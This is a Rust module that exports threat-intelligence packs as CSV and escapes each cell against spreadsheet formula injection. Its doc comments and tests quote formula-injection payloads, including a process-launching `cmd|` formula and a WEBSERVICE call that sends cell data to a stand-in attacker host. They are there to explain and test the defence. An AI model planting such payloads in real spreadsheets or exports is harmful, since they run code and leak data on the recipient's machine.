//! CSV, written for a consumer that is a spreadsheet.
//!
//! # Formula injection is the whole reason this module has an argument in it
//!
//! [#54](https://github.com/jusso-dev/Brolga/issues/54) requires that "CSV protects spreadsheet
//! consumers from formula execution". That is a security requirement, not a formatting preference,
//! and the reasoning is worth stating because the fix looks like a cosmetic quirk.
//!
//! A CSV of threat intelligence gets opened in Excel, LibreOffice, or Google Sheets — that is what
//! CSV is *for*. Those programs treat a cell beginning `=`, `+`, `-`, or `@` as a formula and
//! evaluate it on open. Some of them will evaluate `=cmd|'/c calc'!A0` into a process launch, and
//! several will happily evaluate `=WEBSERVICE("http://attacker.example/?d="&A1)`, exfiltrating the
//! neighbouring cell.
//!
//! Now consider where the cell content came from. A pack's findings and claims quote *feed text* —
//! [`brolga_model::UntrustedText`], typed that way precisely because it is somebody else's words. A
//! feed publisher who wants to run code on an analyst's laptop needs only to name an indicator
//! `=cmd|'/c calc'!A0` and wait for somebody to export to CSV and double-click it.
//!
//! So every value is escaped: a leading `=`, `+`, `-`, `@`, tab, or carriage return gets a `'`
//! prefix, which every spreadsheet reads as "this is text". The cost is a visible apostrophe in a
//! handful of cells. The alternative is arbitrary code execution on the consumer's machine, and there
//! is no version of that trade worth making.
//!
//! `-` is on the list even though it makes `-1` display as `'-1`, because `-1+cmd|…` is a formula
//! too, and a rule with an exception for "looks like a negative number" is a rule an attacker
//! formats around.
//!
//! # The shape
//!
//! One row per item, not one row per pack. A pack is a tree and CSV is a table, so the export is a
//! flattening: `kind`, `key`, `value`, `status`, `confidence`, `evidence`. That loses the tree, which
//! is why this is [`Lossiness::Compressed`] and why the losses are declared.
//!
//! The header row is fixed. A consumer parsing by column position is doing something reasonable, and
//! reordering columns in a patch release would break them silently.

use crate::{
    Cleared, ExportError, ExportMetadata, Exported, Exporter, ExporterId, Lossiness, Orientation,
    metadata,
};

/// This exporter's identifier.
pub const CSV_ID: ExporterId = ExporterId::new("brolga.export.csv");

/// The header row, fixed.
///
/// A compatibility surface: a consumer parsing by position is doing something reasonable, and
/// reordering these in a patch release would break them without an error.
pub const COLUMNS: &[&str] = &["kind", "key", "value", "status", "confidence", "evidence"];

/// The characters that make a spreadsheet treat a cell as a formula.
///
/// `\t` and `\r` are here because some importers strip them and then evaluate what is left, so a
/// value of `"\t=cmd|…"` reaches the formula parser with the tab gone.
pub const FORMULA_LEADERS: &[char] = &['=', '+', '-', '@', '\t', '\r'];

/// What CSV cannot carry, declared.
pub const LOSSES: &[&str] = &[
    "the graph structure: a pack is a tree and CSV is a table, so relationships appear as rows rather than as edges",
    "the budget report and its accounting",
    "the pack fingerprint and schema version",
    "expansion handles",
    "nested evidence beyond the first source object per row",
];

/// A CSV writer.
#[derive(Debug, Default, Clone, Copy)]
pub struct CsvExporter;

impl CsvExporter {
    /// Build one.
    #[must_use]
    pub const fn new() -> Self {
        Self
    }

    /// Build one boxed.
    #[must_use]
    pub fn boxed() -> Box<dyn Exporter> {
        Box::new(Self)
    }
}

impl Exporter for CsvExporter {
    fn metadata(&self) -> ExportMetadata {
        metadata(
            CSV_ID,
            1,
            "text/csv",
            "csv",
            Orientation::Machine,
            Lossiness::Compressed,
            "One row per item, flattened, with every value escaped against spreadsheet formula \
             execution.",
        )
    }

    fn emit(&self, cleared: &Cleared<'_>) -> Result<Exported, ExportError> {
        let pack = cleared.pack();
        let mut rows: Vec<Vec<String>> = Vec::new();

        rows.push(COLUMNS.iter().map(|column| (*column).to_owned()).collect());

        // The subject first: the thing every other row is about.
        rows.push(vec![
            "subject".to_owned(),
            pack.subject.kind.as_str().to_owned(),
            pack.subject.value.as_str().to_owned(),
            pack.disposition.as_str().to_owned(),
            String::new(),
            pack.subject.observable_id.clone(),
        ]);

        for finding in &pack.findings {
            rows.push(vec![
                "finding".to_owned(),
                finding.kind.as_str().to_owned(),
                finding.statement.as_str().to_owned(),
                String::new(),
                String::new(),
                first_evidence(&finding.evidence),
            ]);
        }
        for recommendation in &pack.recommendations {
            rows.push(vec![
                "recommendation".to_owned(),
                recommendation.action.as_str().to_owned(),
                recommendation.rationale.as_str().to_owned(),
                String::new(),
                String::new(),
                first_evidence(&recommendation.evidence),
            ]);
        }
        for entity in &pack.graph.entities {
            rows.push(vec![
                "entity".to_owned(),
                entity.kind.as_str().to_owned(),
                entity.name.as_str().to_owned(),
                entity.status.as_str().to_owned(),
                String::new(),
                entity.id.clone(),
            ]);
        }
        for claim in &pack.graph.claims {
            rows.push(vec![
                "claim".to_owned(),
                claim.predicate.as_str().to_owned(),
                claim.object.as_str().to_owned(),
                claim.status.as_str().to_owned(),
                claim
                    .confidence
                    .map(|score| score.to_string())
                    .unwrap_or_default(),
                first_evidence(&claim.evidence),
            ]);
        }
        for relationship in &pack.graph.relationships {
            rows.push(vec![
                "relationship".to_owned(),
                relationship.kind.as_str().to_owned(),
                format!("{} -> {}", relationship.source, relationship.target),
                relationship.status.as_str().to_owned(),
                String::new(),
                String::new(),
            ]);
        }
        for sighting in &pack.graph.sightings {
            rows.push(vec![
                "sighting".to_owned(),
                sighting.first_seen.clone(),
                sighting.last_seen.clone(),
                String::new(),
                sighting.count.to_string(),
                sighting.observer.clone().unwrap_or_default(),
            ]);
        }
        for contradiction in &pack.graph.contradictions {
            rows.push(vec![
                "contradiction".to_owned(),
                contradiction.subject.as_str().to_owned(),
                format!(
                    "{} vs {}",
                    contradiction.left.as_str(),
                    contradiction.right.as_str()
                ),
                String::new(),
                String::new(),
                first_evidence(&contradiction.evidence),
            ]);
        }
        for technique in &pack.graph.techniques {
            rows.push(vec![
                "technique".to_owned(),
                technique.as_str().to_owned(),
                String::new(),
                String::new(),
                String::new(),
                String::new(),
            ]);
        }
        for pivot in &pack.graph.pivots {
            rows.push(vec![
                "pivot".to_owned(),
                pivot.target.as_str().to_owned(),
                pivot.reason.as_str().to_owned(),
                String::new(),
                String::new(),
                String::new(),
            ]);
        }
        // Gaps and exclusions are rows too. A CSV that listed only what was found would read as
        // complete, which is the one thing a pack's design refuses to let it do.
        for gap in &pack.gaps {
            rows.push(vec![
                "gap".to_owned(),
                gap.subject.as_str().to_owned(),
                gap.detail.as_str().to_owned(),
                String::new(),
                String::new(),
                String::new(),
            ]);
        }
        for exclusion in &pack.exclusions {
            rows.push(vec![
                "exclusion".to_owned(),
                exclusion.category.as_str().to_owned(),
                exclusion.reason.as_str().to_owned(),
                String::new(),
                exclusion
                    .dropped
                    .map(|count| count.to_string())
                    .unwrap_or_default(),
                String::new(),
            ]);
        }

        let mut text = String::new();
        for row in &rows {
            let encoded: Vec<String> = row.iter().map(|cell| cell_of(cell)).collect();
            text.push_str(&encoded.join(","));
            // CRLF: the line ending every spreadsheet importer agrees on, and what RFC 4180 states.
            text.push_str("\r\n");
        }

        Ok(Exported {
            metadata: self.metadata(),
            bytes: text.into_bytes(),
            declared_losses: LOSSES.to_vec(),
        })
    }
}

/// The first source object a list of evidence cites.
fn first_evidence(evidence: &[brolga_model::pack::EvidenceRef]) -> String {
    evidence
        .first()
        .map(|reference| reference.source_object_id.clone())
        .unwrap_or_default()
}

/// Escape one cell: formula-neutralise, then quote.
///
/// Two separate concerns, in this order. Neutralising first means the `'` lands inside the quotes
/// where a spreadsheet sees it, rather than outside them where the CSV parser would eat it.
#[must_use]
pub fn cell_of(value: &str) -> String {
    let neutralised = neutralise(value);
    // Quote when the value contains a delimiter, a quote, or a newline — and always when it was
    // neutralised, so the `'` is unambiguous.
    let needs_quotes = neutralised != value
        || neutralised.contains([',', '"', '\n', '\r'])
        || neutralised.starts_with(' ')
        || neutralised.ends_with(' ');
    if needs_quotes {
        format!("\"{}\"", neutralised.replace('"', "\"\""))
    } else {
        neutralised
    }
}

/// Prefix a leading formula character with `'`.
///
/// Only the *leading* character matters: a spreadsheet decides whether a cell is a formula from its
/// first character, so `a=1` is text and `=1` is not.
#[must_use]
pub fn neutralise(value: &str) -> String {
    match value.chars().next() {
        Some(first) if FORMULA_LEADERS.contains(&first) => format!("'{value}"),
        _ => value.to_owned(),
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod tests {
    use super::*;

    /// **The criterion.** A value a spreadsheet would execute is neutralised.
    #[test]
    fn every_formula_leader_is_neutralised() {
        for hostile in [
            "=cmd|'/c calc'!A0",
            "+1+1",
            "-1+cmd|'/c calc'!A0",
            "@SUM(A1)",
            "\t=WEBSERVICE(\"http://attacker.invalid\")",
            "\r=1",
        ] {
            let cell = cell_of(hostile);
            assert!(
                cell.starts_with("\"'"),
                "`{hostile}` reached the spreadsheet as a formula: {cell}"
            );
        }
    }

    /// `-1` displaying as `'-1` is the price. Stated as a test so the trade is deliberate rather than
    /// something a later reader "fixes".
    #[test]
    fn a_negative_number_is_escaped_too_and_that_is_the_intended_trade() {
        assert_eq!(cell_of("-1"), "\"'-1\"");
    }

    /// Only the leading character decides. `a=1` is text and must not be mangled.
    #[test]
    fn a_formula_character_that_is_not_leading_is_left_alone() {
        assert_eq!(neutralise("a=1"), "a=1");
        assert_eq!(neutralise("1+1"), "1+1");
        assert_eq!(cell_of("plain"), "plain");
    }

    #[test]
    fn quoting_follows_rfc_4180() {
        assert_eq!(cell_of("a,b"), "\"a,b\"");
        assert_eq!(cell_of("say \"hi\""), "\"say \"\"hi\"\"\"");
        assert_eq!(cell_of("two\nlines"), "\"two\nlines\"");
        assert_eq!(cell_of(" padded "), "\" padded \"");
    }

    /// The neutralising quote lands *inside* the CSV quotes, where the spreadsheet sees it. Outside
    /// them the parser would strip it and the formula would execute.
    #[test]
    fn the_neutralising_quote_is_inside_the_csv_quotes() {
        let cell = cell_of("=1");
        assert_eq!(cell, "\"'=1\"");
        assert!(!cell.starts_with('\''), "{cell}");
    }

    #[test]
    fn the_column_list_is_stable_and_distinct() {
        let mut sorted = COLUMNS.to_vec();
        sorted.sort_unstable();
        sorted.dedup();
        assert_eq!(sorted.len(), COLUMNS.len());
        assert_eq!(COLUMNS.first(), Some(&"kind"));
    }

    #[test]
    fn the_declared_losses_are_not_empty() {
        // The lossiness level requires it, and `a_partially_lossless_export_names_what_it_dropped`
        // checks the whole registry — this keeps the module self-contained too.
        assert!(Lossiness::Compressed.must_declare_losses());
        assert!(!LOSSES.is_empty());
    }
}
